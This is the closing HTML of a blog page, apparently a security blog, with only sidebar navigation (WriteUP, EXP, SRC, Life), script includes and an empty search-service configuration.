                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/tags/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
